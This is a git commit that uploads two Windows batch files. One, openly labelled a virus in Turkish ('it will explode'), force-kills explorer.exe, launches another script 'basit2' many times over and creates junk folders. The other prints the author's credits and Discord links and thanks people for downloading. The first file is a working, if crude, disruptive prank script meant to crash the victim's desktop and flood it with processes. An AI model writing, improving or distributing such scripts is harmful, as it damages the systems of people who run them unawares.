5cbc7c5e35a0e2a0b252a475c3d5e0bf93d60feb
Hasan89-lang <hesen188hesenli@gmail.com>
2024-11-08 20:56:38 +0300

    Add files via upload

---
+++ Basit/basit.bat
@@ -0,0 +1,27 @@
+@echo off
+echo VIRUS VAR
+echo NOT:PATLAYACAK:)
+start basit2
+taskkill /f /im explorer.exe
+start basit2
+start basit2
+md virus3
+start basit2
+start basit2
+md virus4646
+start basit2
+md virus6466
+start basit2
+start basit2
+md virus46456
+start basit2
+start basit2
+start basit2
+md virus1
+start basit2
+start basit2
+md virus52767
+start basit2
+md virus6374674
+start basit2
+pause
---
+++ Basit/producers.bat
@@ -0,0 +1,9 @@
+echo off
+title producers-basit
+
+echo Made By: Hasan89===
+echo Discord: https://discord.gg/qnH4p5Ge 
+echo sponsor: discord.gg/unitypvp
+echo Thank you for download this file 
+echo Note:(I'm from Turkey :))
+pause
